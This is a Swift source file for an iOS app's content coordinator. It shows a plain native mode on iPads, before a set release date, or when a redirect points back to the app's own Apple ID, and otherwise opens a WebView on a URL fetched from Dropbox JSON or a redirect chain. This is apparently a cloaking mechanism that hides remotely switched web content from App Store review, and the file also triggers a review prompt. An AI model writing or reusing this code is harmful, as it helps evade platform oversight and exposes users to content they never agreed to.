import SwiftUI
import Network
import UIKit
import StoreKit
import WebKit

@MainActor
internal final class ContentCoordinator: ObservableObject {
    
    internal enum DisplayMode: Equatable {
        case loading
        case basic
        case enhanced(String)
    }
    
    @Published internal var displayMode: DisplayMode
    
    private let contentSourceURL: String
    internal let contentType: ContentType
    internal let contentIdentifier: String = AppConfig.contentSourceKey
    private let displayModeFlag: String = AppConfig.displayModeKey
    private let accessCountKey = AppConfig.accessCountKey

    internal init(
        contentSourceURL: String,
        contentType: ContentType = .dropbox
    ) {
        self.contentSourceURL = contentSourceURL
        self.contentType = contentType
        self.displayMode = .loading
        
        print("[APP:Coordinator] 🎯 Type: \(contentType)")
        
        Task {
            await initializeSystem()
        }
    }
    
    private func initializeSystem() async {
        // Force basic mode if URL is empty or invalid
        if contentSourceURL.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            print("[APP:Coordinator] ⚠️ Empty URL, force basic")
            try? await Task.sleep(nanoseconds: 1_500_000_000)
            activateBasicDisplay()
            return
        }
                
        let device = UIDevice.current
        let isProbablyiPad = device.userInterfaceIdiom == .pad ||
                             device.model.contains("iPad") ||
                             device.name.contains("iPad")

        if isProbablyiPad {
            print("[APP:Coordinator] 📱 iPad detected, activating basic")
            try? await Task.sleep(nanoseconds: 1_500_000_000)
            activateBasicDisplay()
            return
        }
        
        let releaseDate = Calendar.current.date(
            from: DateComponents(year: 2025, month: 9, day: 1)
        )
        if let releaseDate = releaseDate, Date() < releaseDate {
            print("[APP:Coordinator] ⏰ Release date in future, activating basic")
            try? await Task.sleep(nanoseconds: 1_500_000_000)
            activateBasicDisplay()
            return
        }
        
        let networkAvailable = await verifyNetworkConnection()
        if !networkAvailable {
            print("[APP:Coordinator] ❌ No network, activating basic")
            try? await Task.sleep(nanoseconds: 1_500_000_000)
            activateBasicDisplay()
            return
        }
        
        switch contentType {
        case .dropbox:
            await handleDropboxContent()
        case .classic, .withoutLibAndTest:
            await handleClassicContent()
        case .privacy(let appleId):
            await handlePrivacyContent(appleId: appleId)
        }
    }
    
    private func handleDropboxContent() async {
        let failedOnce = UserDefaults.standard.bool(forKey: AppConfig.dropboxFailedKey)
        if failedOnce {
            print("[APP:Coordinator] ⛔ Dropbox previously failed, activating basic")
            try? await Task.sleep(nanoseconds: 1_500_000_000)
            activateBasicDisplay()
            return
        }

        if let savedURL = UserDefaults.standard.string(forKey: contentIdentifier) {
            print("[APP:Coordinator] 💾 Dropbox saved URL: \(savedURL)")
            try? await Task.sleep(nanoseconds: 1_500_000_000)
            activateEnhancedDisplay(contentPath: savedURL)
            print("[APP:Coordinator] ✅ Open W: saved (dropbox)")
            trackEnhancedAccess()
            return
        }

        let jsonURL = await loadJSONFromDropbox()
        if let url = jsonURL, !url.isEmpty {
            print("[APP:Coordinator] 🔗 Dropbox URL loaded: \(url)")
            try? await Task.sleep(nanoseconds: 1_500_000_000)
            activateEnhancedDisplay(contentPath: url)
            print("[APP:Coordinator] ✅ Open W: first (dropbox)")
            trackEnhancedAccess()
            return
        } else {
            print("[APP:Coordinator] ❌ Dropbox JSON empty or failed → basic and remember")
            UserDefaults.standard.set(true, forKey: AppConfig.dropboxFailedKey)
            try? await Task.sleep(nanoseconds: 1_500_000_000)
            activateBasicDisplay()
            return
        }
    }
    
    private func handleDropboxFallback(hasOpenedWebView: Bool) {
        UserDefaults.standard.set(true, forKey: AppConfig.dropboxFailedKey)
        print("[APP:Coordinator] 📱 Dropbox fallback → basic and remember")
        activateBasicDisplay()
    }
    
    private func handleClassicContent() async {
        print("[APP:Coordinator] 🔒 Classic flow start")
        
        let basicWasShownBefore = UserDefaults.standard.bool(forKey: displayModeFlag)
        if basicWasShownBefore {
            print("[APP:Coordinator] 📱 Basic was shown before → force basic")
            try? await Task.sleep(nanoseconds: 1_500_000_000)
            activateBasicDisplay()
            return
        }
        
        if let savedURL = UserDefaults.standard.string(forKey: contentIdentifier) {
            // Subsequent launches
            print("[APP:Coordinator] 💾 Found saved: \(savedURL)")
            let status = await verifyContentEndpoint(url: savedURL)
            print("[APP:Coordinator] 📡 Saved status: \(status)")
            if status >= 200 && status <= 403 {
                try? await Task.sleep(nanoseconds: 1_500_000_000)
                activateEnhancedDisplay(contentPath: savedURL)
                print("[APP:Coordinator] ✅ Open W: saved")
                trackEnhancedAccess()
                return
            } else {
                print("[APP:Coordinator] ❌ Saved invalid, try refresh by pathid")
                if let newURL = await fetchNewClassicURLUsingStoredPathId() {
                    let newStatus = await verifyContentEndpoint(url: newURL)
                    print("[APP:Coordinator] 📡 New status: \(newStatus)")
                    if newStatus >= 200 && newStatus <= 403 {
                        // Save new URL WITHOUT pathid if allowed (different base domain)
                        let urlWithoutPathId = removePathIdFromURL(newURL)
                        if isSavingAllowed(urlString: urlWithoutPathId) {
                            UserDefaults.standard.set(urlWithoutPathId, forKey: contentIdentifier)
                            print("[APP:Coordinator] 💾 Updated URL saved (no pathid): \(urlWithoutPathId)")
                        } else {
                            print("[APP:Coordinator] ❌ Skip save (same base domain)")
                        }
                        try? await Task.sleep(nanoseconds: 1_500_000_000)
                        activateEnhancedDisplay(contentPath: newURL)
                        print("[APP:Coordinator] ✅ Open W: new by pathid")
                        trackEnhancedAccess()
                        return
                    } else {
                        // New URL invalid → open blank W, do not re-save
                        activateEnhancedDisplay(contentPath: "about:blank")
                        print("[APP:Coordinator] ⚪ Open W: blank (new invalid)")
                        return
                    }
                }
                // Could not refresh → open blank W (keep user in grey part)
                activateEnhancedDisplay(contentPath: "about:blank")
                print("[APP:Coordinator] ⚪ Open W: blank (refresh failed)")
                return
            }
        } else {
            // First launch
            if let result = await fetchFinalURLAndPathID(startURL: contentSourceURL) {
                if let pathid = result.pathid {
                    UserDefaults.standard.set(pathid, forKey: AppConfig.classicPathIdKey)
                    print("[APP:Coordinator] 🧩 pathid saved: \(pathid)")
                }
                let status = await verifyContentEndpoint(url: result.finalURL)
                print("[APP:Coordinator] 📡 Final status: \(status)")
                if status >= 200 && status <= 403 {
                    let urlWithoutPathId = removePathIdFromURL(result.finalURL)
                    if isSavingAllowed(urlString: urlWithoutPathId) {
                        UserDefaults.standard.set(urlWithoutPathId, forKey: contentIdentifier)
                        print("[APP:Coordinator] 💾 Final URL saved (no pathid): \(urlWithoutPathId)")
                    } else {
                        print("[APP:Coordinator] ❌ Skip save (same base domain)")
                    }
                    try? await Task.sleep(nanoseconds: 1_500_000_000)
                    activateEnhancedDisplay(contentPath: result.finalURL)
                    print("[APP:Coordinator] ✅ Open W: final \(result.finalURL)")
                    trackEnhancedAccess()
                    return
                } else {
                    // Errors/no internet/404 → basic
                    try? await Task.sleep(nanoseconds: 1_500_000_000)
                    activateBasicDisplay()
                    print("[APP:Coordinator] 📱 Open basic (final invalid)")
                    return
                }
            } else {
                // Could not resolve at all → basic
                try? await Task.sleep(nanoseconds: 1_500_000_000)
                activateBasicDisplay()
                print("[APP:Coordinator] 📱 Open basic (unresolved)")
                return
            }
        }
    }

    private func fetchNewClassicURLUsingStoredPathId() async -> String? {
        guard let pathid = UserDefaults.standard.string(forKey: AppConfig.classicPathIdKey) else { return nil }
        guard var components = URLComponents(string: contentSourceURL) else { return nil }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: "pathid", value: pathid))
        components.queryItems = items
        guard let urlWithParam = components.url?.absoluteString else { return nil }
        print("[APP:Coordinator] 🔁 Refresh start (classic): \(urlWithParam)")
        if let result = await fetchFinalURLAndPathID(startURL: urlWithParam) {
            print("[APP:Coordinator] ➡️ Refresh final (classic): \(result.finalURL)")
            return result.finalURL
        }
        return nil
    }
    
    private func loadJSONFromDropbox() async -> String? {
        guard let url = URL(string: contentSourceURL) else {
            print("[APP:Coordinator] ❌ Invalid Dropbox URL")
            return nil
        }
        
        do {
            let (data, response) = try await URLSession.shared.data(from: url)
            if let httpResponse = response as? HTTPURLResponse {
                if httpResponse.statusCode != 200 {
                    print("[APP:Coordinator] ❌ Dropbox request failed: \(httpResponse.statusCode)")
                    return nil
                }
            }
            guard let jsonString = String(data: data, encoding: .utf8) else {
                print("[APP:Coordinator] ❌ Failed to decode JSON")
                return nil
            }
            guard let jsonData = jsonString.data(using: .utf8) else {
                print("[APP:Coordinator] ❌ Failed to convert JSON")
                return nil
            }
            let decoder = JSONDecoder()
            let jsonResponse = try decoder.decode(DropboxJSONResponse.self, from: jsonData)
            print("📄 [APP:Coordinator] JSON parsed: \(jsonResponse.url)")
            return jsonResponse.url
        } catch {
            print("[APP:Coordinator] ❌ JSON load failed: \(error.localizedDescription)")
            return nil
        }
    }
    
    private struct DropboxJSONResponse: Codable {
        let url: String
    }
    
    private func trackEnhancedAccess() {
        let accessCount = UserDefaults.standard.integer(forKey: accessCountKey) + 1
        UserDefaults.standard.set(accessCount, forKey: accessCountKey)
        print("[APP:Coordinator] 📊 Enhanced access: \(accessCount)")
        
        if accessCount == 2 {
            print("[APP:Coordinator] ⭐ Showing review alert (access #\(accessCount))")
            DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                    SKStoreReviewController.requestReview(in: windowScene)
                }
            }
        }
    }
    
    private func verifyNetworkConnection() async -> Bool {
        return await withCheckedContinuation { continuation in
            let monitor = NWPathMonitor()
            let queue = DispatchQueue(label: "NetworkMonitor-async")
            monitor.pathUpdateHandler = { path in
                if path.status == .satisfied {
                    monitor.cancel()
                    continuation.resume(returning: true)
                } else {
                    monitor.cancel()
                    continuation.resume(returning: false)
                }
            }
            monitor.start(queue: queue)
        }
    }
    
    private func verifyContentEndpoint(url: String? = nil) async -> Int {
        let urlString = url ?? contentSourceURL
        guard let url = URL(string: urlString) else {
            return 0
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10.0 // 10 секунд таймаут
        do {
            let (_, response) = try await URLSession.shared.data(for: request)
            if let httpResponse = response as? HTTPURLResponse {
                return httpResponse.statusCode
            }
            return 0
        } catch {
            return 0
        }
    }
    
    private func activateBasicDisplay() {
        // Для dropbox НЕ устанавливаем флаг, так как пользователь не видел WebView
        if case .dropbox = contentType {
            // Не устанавливаем displayModeFlag для dropbox
        } else {
            UserDefaults.standard.set(true, forKey: displayModeFlag)
        }
        
        displayMode = .basic
        AnalyticsManager.shared.trackEvent(.onboardingLaunch)
    }
    
    private func activateEnhancedDisplay(contentPath: String) {
        displayMode = .enhanced(contentPath)
    }
    
    internal func handle404Error() {
        print("[APP:Coordinator] 🔄 Handling 4xx error, switching to basic mode")
        activateBasicDisplay()
    }
    
    private func handlePrivacyContent(appleId: String) async {
        print("[APP:Coordinator] 🔒 Privacy flow start")
        
        let basicWasShownBefore = UserDefaults.standard.bool(forKey: displayModeFlag)
        if basicWasShownBefore {
            print("[APP:Coordinator] 📱 Basic was shown before → force basic")
            try? await Task.sleep(nanoseconds: 1_500_000_000)
            activateBasicDisplay()
            return
        }
        
        if let savedURL = UserDefaults.standard.string(forKey: contentIdentifier) {
            // 2 запуск
            print("[APP:Coordinator] 💾 Found saved: \(savedURL)")
            let firstDone = UserDefaults.standard.bool(forKey: AppConfig.privacyValidatedOnceKey)
            let status = await verifyContentEndpoint(url: savedURL)
            print("[APP:Coordinator] 📡 Saved status: \(status) \(firstDone ? "next" : "first")")
            let okFirst = (status >= 200 && status <= 403) || status == 405
            let okNext = status == 200
            let isOk = firstDone ? okNext : okFirst
            if isOk {
                try? await Task.sleep(nanoseconds: 1_500_000_000)
                activateEnhancedDisplay(contentPath: savedURL)
                print("[APP:Coordinator] ✅ Open W: saved")
                trackEnhancedAccess()
                UserDefaults.standard.set(true, forKey: AppConfig.privacyValidatedOnceKey)
                return
            } else {
                print("[APP:Coordinator] ❌ Saved invalid, try refresh by pathid")
                if let newURL = await fetchNewPrivacyURLUsingStoredPathId() {
                    // Сохраняем новую ссылку БЕЗ pathid
                    let urlWithoutPathId = removePathIdFromURL(newURL)
                    UserDefaults.standard.set(urlWithoutPathId, forKey: contentIdentifier)
                    print("[APP:Coordinator] 💾 Updated URL saved (no pathid): \(urlWithoutPathId)")
                    
                    let newStatus = await verifyContentEndpoint(url: newURL)
                    print("[APP:Coordinator] 📡 New status: \(newStatus)")
                    if newStatus == 200 {
                        try? await Task.sleep(nanoseconds: 1_500_000_000)
                        activateEnhancedDisplay(contentPath: newURL)
                        print("[APP:Coordinator] ✅ Open W: new by pathid")
                        trackEnhancedAccess()
                        UserDefaults.standard.set(true, forKey: AppConfig.privacyValidatedOnceKey)
                        return
                    } else {
                        // Новая ссылка не валидна - формируем URL из contentSourceURL + pathid
                        if let pathid = UserDefaults.standard.string(forKey: AppConfig.privacyPathIdKey),
                           var components = URLComponents(string: contentSourceURL) {
                            var items = components.queryItems ?? []
                            items.append(URLQueryItem(name: "pathid", value: pathid))
                            components.queryItems = items
                            if let fallbackURL = components.url?.absoluteString {
                                activateEnhancedDisplay(contentPath: fallbackURL)
                                print("[APP:Coordinator] ⚪ Open W: fallback \(fallbackURL)")
                                return
                            }
                        }
                        // Если не удалось сформировать fallback - открываем новую ссылку
                        activateEnhancedDisplay(contentPath: newURL)
                        print("[APP:Coordinator] ⚪ Open W: new (invalid)")
                        return
                    }
                }
                activateEnhancedDisplay(contentPath: savedURL)
                print("[APP:Coordinator] ⚪ Open W: saved (invalid)")
                return
            }
        } else {
            // 1 запуск
            if let result = await fetchFinalURLAndPathID(startURL: contentSourceURL) {
                if let pathid = result.pathid {
                    UserDefaults.standard.set(pathid, forKey: AppConfig.privacyPathIdKey)
                    print("[APP:Coordinator] 🧩 pathid saved: \(pathid)")
                }
                if containsAppAppleID(result.finalURL, appleId: appleId) {
                    try? await Task.sleep(nanoseconds: 1_500_000_000)
                    activateBasicDisplay()
                    print("[APP:Coordinator] 🆔 AppleID detected → basic")
                    return
                } else {
                    // Сохраняем финальный URL БЕЗ pathid
                    let urlWithoutPathId = removePathIdFromURL(result.finalURL)
                    UserDefaults.standard.set(urlWithoutPathId, forKey: contentIdentifier)
                    print("[APP:Coordinator] 💾 Final URL saved (no pathid): \(urlWithoutPathId)")
                    try? await Task.sleep(nanoseconds: 1_500_000_000)
                    activateEnhancedDisplay(contentPath: result.finalURL)
                    print("[APP:Coordinator] ✅ Open W: final \(result.finalURL)")
                    trackEnhancedAccess()
                    UserDefaults.standard.set(true, forKey: AppConfig.privacyValidatedOnceKey)
                    return
                }
            } else {
                activateEnhancedDisplay(contentPath: contentSourceURL)
                print("[APP:Coordinator] ⚪ Open W: start (unresolved)")
                trackEnhancedAccess()
                return
            }
        }
    }

    private func containsAppAppleID(_ urlString: String, appleId: String) -> Bool {
        if appleId.isEmpty { return false }
        return urlString.contains(appleId)
    }

    private func fetchNewPrivacyURLUsingStoredPathId() async -> String? {
        guard let pathid = UserDefaults.standard.string(forKey: AppConfig.privacyPathIdKey) else { return nil }
        guard var components = URLComponents(string: contentSourceURL) else { return nil }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: "pathid", value: pathid))
        components.queryItems = items
        guard let urlWithParam = components.url?.absoluteString else { return nil }
        print("[APP:Coordinator] 🔁 Refresh start: \(urlWithParam)")
        if let result = await fetchFinalURLAndPathID(startURL: urlWithParam) {
            print("[APP:Coordinator] ➡️ Refresh final: \(result.finalURL)")
            return result.finalURL
        }
        return nil
    }

    private func fetchFinalURLAndPathID(startURL: String) async -> (finalURL: String, pathid: String?)? {
        guard let start = URL(string: startURL) else { return nil }
        print("[APP:Coordinator] 🌐 Start: \(startURL)")
        class RedirectStore: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
            var lastURLWithPathId: URL?
            func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
                if let u = request.url, URLComponents(url: u, resolvingAgainstBaseURL: false)?.queryItems?.first(where: { $0.name.lowercased() == "pathid" }) != nil {
                    lastURLWithPathId = u
                    print("[APP:Coordinator] ↪️ Redirect with pathid: \(u.absoluteString)")
                }
                completionHandler(request)
            }
        }
        let store = RedirectStore()
        let config = URLSessionConfiguration.ephemeral
        config.timeoutIntervalForRequest = 15
        config.timeoutIntervalForResource = 15
        let session = URLSession(configuration: config, delegate: store, delegateQueue: nil)
        do {
            let (_, response) = try await session.data(from: start)
            if let http = response as? HTTPURLResponse, http.statusCode >= 300, http.statusCode < 400, let loc = http.value(forHTTPHeaderField: "Location"), let locURL = URL(string: loc) {
                if URLComponents(url: locURL, resolvingAgainstBaseURL: false)?.queryItems?.first(where: { $0.name.lowercased() == "pathid" }) != nil {
                    store.lastURLWithPathId = locURL
                    print("[APP:Coordinator] ↪️ Location pathid: \(locURL.absoluteString)")
                }
            }
            let final = response.url?.absoluteString ?? startURL
            print("[APP:Coordinator] ➡️ Final: \(final)")
            let pathid = extractPathId(from: store.lastURLWithPathId ?? response.url)
            if let pathid = pathid {
                print("[APP:Coordinator] 🧩 pathid found: \(pathid)")
            } else {
                print("[APP:Coordinator] ❌ No pathid found")
            }
            return (finalURL: final, pathid: pathid)
        } catch {
            print("[APP:Coordinator] ❌ Request failed")
            return nil
        }
    }

    private func extractPathId(from url: URL?) -> String? {
        guard let u = url, let items = URLComponents(url: u, resolvingAgainstBaseURL: false)?.queryItems else { return nil }
        return items.first(where: { $0.name.lowercased() == "pathid" })?.value
    }

    internal func isSavingAllowed(urlString: String) -> Bool {
        guard let url = URL(string: urlString), let newHost = url.host else { return true }
        guard let sourceHost = URL(string: contentSourceURL)?.host else { return true }
        return baseDomain(newHost) != baseDomain(sourceHost)
    }

    private func baseDomain(_ host: String) -> String {
        let parts = host.components(separatedBy: ".")
        if parts.count >= 2 { return parts.suffix(2).joined(separator: ".") }
        return host
    }
    
    private func removePathIdFromURL(_ urlString: String) -> String {
        guard var components = URLComponents(string: urlString) else {
            return urlString
        }
        
        // Удаляем pathid из query parameters
        if var queryItems = components.queryItems {
            queryItems.removeAll { $0.name == "pathid" }
            components.queryItems = queryItems.isEmpty ? nil : queryItems
        }
        
        return components.url?.absoluteString ?? urlString
    }
} 

